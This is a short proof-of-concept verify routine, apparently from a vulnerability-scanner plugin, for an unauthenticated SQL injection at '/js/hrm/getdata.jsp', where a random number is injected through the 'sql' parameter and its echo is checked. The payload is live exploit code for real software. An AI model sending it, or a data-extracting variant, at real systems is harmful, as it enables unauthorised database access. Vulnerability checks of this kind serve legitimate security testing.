### 前台SQL注入漏洞-/js/hrm/getdata.jsp
verify:
```python
rand_num = int(random_str(6, "123456789"))
        vul_path = '/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20{}%20as%20id'.format(rand_num)
        vul_url = url + vul_path
        resp = requests.get(vul_url,allow_redirects=False, verify=False)
        if resp and resp.status_code == 200 and str(rand_num) in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
        return self.parse_output(result)
```
